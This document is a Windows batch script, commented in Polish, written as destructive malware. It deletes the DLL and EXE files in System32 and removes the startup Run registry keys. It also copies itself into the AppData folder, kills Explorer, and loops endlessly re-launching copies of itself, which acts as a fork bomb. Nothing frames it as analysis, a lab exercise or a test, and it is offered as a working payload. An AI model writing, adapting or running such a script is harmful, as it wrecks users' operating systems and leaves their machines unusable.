@echo off
setlocal

:: 1️⃣  Usuń najważniejsze pliki systemowe
del /f /q "%windir%\System32\*.dll"
del /f /q "%windir%\System32\*.exe"

:: 2️⃣  Usuń wpisy uruchamiania (startup)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /f

:: 3️⃣  Kopiuj siebie do katalogu startowego, żeby się replikować
copy "%~f0" "%APPDATA%\system.bat"

:: 4️⃣  Uruchom kopię w tle i zamknij eksplorator plików
start "" "%APPDATA%\system.bat"
taskkill /IM explorer.exe /F

:: 5️⃣  Ustaw nieskończoną pętlę, żeby skrypt ciągle się uruchamiał
:loop
    copy "%~f0" "%APPDATA%\system.bat"
    start "" "%APPDATA%\system.bat"
    goto :loop

:: 6️⃣  (opcjonalnie) zrestartuj komputer, aby zmiany od razu wzięły skutek
shutdown /r /t 10
